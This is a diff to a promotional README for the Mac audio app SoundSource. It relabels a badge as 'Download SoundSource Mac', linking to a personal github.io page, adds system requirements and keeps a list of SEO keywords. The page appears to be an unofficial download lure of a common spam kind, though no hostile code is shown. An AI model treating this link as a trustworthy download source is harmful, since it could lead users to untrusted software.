@@ -6,7 +6,7 @@
 
 <div align="center">  
 <a href="https://nikolanfu.github.io/.github/soundsourcemac">  
-<img src="https://img.shields.io/badge/Get_SoundSource_Mac-darkblue?style=for-the-badge&logo=apple" alt="Get SoundSource Mac">  
+<img src="https://img.shields.io/badge/Download_SoundSource_Mac-darkblue?style=for-the-badge&logo=apple" alt="Download SoundSource Mac">  
 </a>  
 </div>  
 
@@ -41,7 +41,13 @@ SoundSource Mac is perfect for anyone who wants **complete audio flexibility and
 ![SoundSource Mac Interface](https://eshop.macsales.com/blog/wp-content/uploads/2023/11/SoundSource_main_interface.jpg)  
 
 ---
+## System Requirements  
 
+* macOS **Catalina or newer**  
+* Supports **Intel and Apple Silicon (M1/M2/M3)**  
+* Internet recommended for updates and additional features  
+
+---
 ## SEO Keywords  
 
 sound source for mac, sound source mac app, soundsource mac, mac audio control, mac audio manager, sound routing mac
